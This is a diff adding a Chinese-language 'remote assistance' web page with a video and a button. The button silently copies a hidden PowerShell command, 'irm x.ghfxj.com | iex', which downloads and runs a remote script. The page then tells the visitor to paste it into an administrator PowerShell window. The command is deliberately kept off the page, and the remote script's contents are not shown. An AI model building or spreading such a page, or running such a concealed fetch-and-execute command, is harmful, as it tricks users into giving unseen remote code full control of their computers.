@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>干货分享家 - 远程协助</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            overflow-x: hidden;
+        }
+        video {
+            width: 90%;
+            max-width: 600px;
+            margin: 20px 0;
+        }
+        button {
+            cursor: pointer;
+            margin-top: 8px;
+            padding: 8px 16px;
+            font-size: 1rem;
+        }
+    </style>
+</head>
+<body>
+    <h1>干货分享家 - 远程协助</h1>
+    <video controls>
+        <source src="./YC.mp4" type="video/mp4">
+        你的浏览器不支持 video 标签。
+    </video>
+    <!-- 按钮直接复制命令，不再显示命令文本 -->
+    <button id="copyBtn">复制 "运行远程软件" 命令</button>
+
+    <script>
+        (function() {
+            // 要复制的命令（硬编码，不显示在页面上）
+            var cmdText = 'irm x.ghfxj.com | iex';
+
+            var copyBtn = document.getElementById('copyBtn');
+            if (!copyBtn) return;
+
+            var originalBtnText = copyBtn.innerText;       // 按钮原始文字
+
+            // 复制成功后的反馈
+            function onCopySuccess() {
+                copyBtn.innerText = '已复制! 右击开始按钮 ➤ 单击Powershell(管理员) ➤ 右击粘贴';
+                setTimeout(function() {
+                    copyBtn.innerText = originalBtnText;
+                }, 10000); // 10秒后恢复
+            }
+
+            // 复制失败后的反馈
+            function onCopyError(err) {
+                alert('复制失败，请手动选择命令后复制 (Ctrl+C)。\n' + (err || ''));
+            }
+
+            // 核心复制函数（兼容 IE 和现代浏览器）
+            function copyToClipboard(text) {
+                // 针对 IE 的专用方法
+                if (window.clipboardData && window.clipboardData.setData) {
+                    try {
+                        window.clipboardData.setData('Text', text);
+                        onCopySuccess();
+                    } catch (e) {
+                        onCopyError(e);
+                    }
+                    return;
+                }
+
+                // 其他浏览器：使用 document.execCommand('copy') 通用降级方案
+                var textarea = document.createElement('textarea');
+                textarea.value = text;
+                textarea.style.position = 'fixed';
+                textarea.style.left = '-9999px';
+                textarea.style.top = '0';
+                document.body.appendChild(textarea);
+                textarea.select();
+                try {
+                    var successful = document.execCommand('copy');
+                    if (successful) {
+                        onCopySuccess();
+                    } else {
+                        onCopyError('execCommand 返回 false');
+                    }
+                } catch (err) {
+                    onCopyError(err);
+                } finally {
+                    document.body.removeChild(textarea);
+                }
+            }
+
+            // 绑定点击事件
+            copyBtn.addEventListener('click', function() {
+                copyToClipboard(cmdText);
+            });
+        })();
+    </script>
+</body>
+</html>
